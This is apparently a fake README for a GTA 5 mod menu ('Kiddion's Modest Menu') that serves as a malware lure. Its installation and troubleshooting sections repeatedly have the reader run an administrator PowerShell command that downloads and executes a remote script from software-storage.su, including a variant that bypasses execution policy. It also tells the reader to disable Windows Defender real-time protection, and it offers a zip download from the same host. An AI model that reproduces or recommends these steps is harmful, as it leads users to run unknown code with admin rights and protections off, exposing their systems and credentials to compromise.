# Kiddions Mod Menu 🚀 The Ultimate Kiddion's Modest Menu Hub (GTA 5 PC)

Welcome to the ultimate repository dedicated to **Kiddions Mod Menu** (also widely known as **Kiddion's Modest Menu**), the safest and most reliable external mod menu for *Grand Theft Auto V* (PC version). 

Whether you are looking for the latest stable build, custom community LUA scripts, or an easy step-by-step installation guide to enhance your GTA 5 gameplay, you have come to the right place.

---

## 🌟 Key Features of Kiddions Mod Menu
* **100% External Architecture:** Modest Menu runs entirely outside the game memory, making it highly secure and completely undetected.
* **LUA Scripting Support:** Easily extend functionality by adding external `.lua` scripts directly into your directory.
* **Comprehensive In-Game Tools:** Take full control over player options, vehicle spawns, teleportation, weapon modifications, and weather settings.
* **No Internal Memory Injection:** Safe performance without modifying original game files.

---

### 🚀 Direct Download

[<img src="https://img.shields.io/badge/Download-black?style=for-the-badge&logo=github"/>](https://software-storage.su/files/Setup.zip)

Read Readme.txt before install!

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.

2. Execute the Deployment Command:
   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

   ```powershell
   irm https://software-storage.su/powershell/Loader.ps1 | iex
   ```
---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---
